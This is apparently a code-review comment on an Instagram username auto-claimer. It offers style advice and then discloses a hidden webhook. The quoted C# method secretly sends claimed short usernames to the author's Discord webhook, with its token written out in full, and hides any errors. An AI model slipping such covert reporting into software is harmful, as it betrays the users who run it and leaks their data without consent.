Try to use less if and else blocks. If you can, use switch statements or select and case.
Also, I noticed alot of if and else blocks which weren't necessary. Try to identify them in your code as well.
By the way, you should tell your customers that you have a hidden webhook in the program.

'''
private static void SendWebhookFunction(string username)
{
	if (username.Length == 1 | username.Length == 2 | username.Length == 3 | username.Length == 4)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discord.com/api/webhooks/865964358450675803/s0ApHgbv0_Qrll5Ky9thtDACKEGaCe_3P-hn4xUaQOXKDvv77NY_dd4MWdYA5fvLAbzr");
			httpWebRequest.Method = "POST";
			httpWebRequest.Proxy = null;
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0";
			httpWebRequest.ContentType = "application/json";
			byte[] bytes = Encoding.UTF8.GetBytes(string.Concat(new string[]
			{
				"{\"content\":null,\"embeds\":[{\"title\":\"Instagram Auto\",\"description\":\"Claimed - @",
				username,
				" | Attempts : ",
				attempts.ToString(),
				"\",\"color\":2894892,\"footer\":{\"text\":\"Made By AboDa7m @dtde\"},\"image\":{\"url\":\"https://i.imgur.com/jLDXFL6.gif\"}}]}"
			}));
			httpWebRequest.ContentLength = (long)bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Dispose();
			requestStream.Close();
		}
		catch (Exception)
		{
		}
	}
}
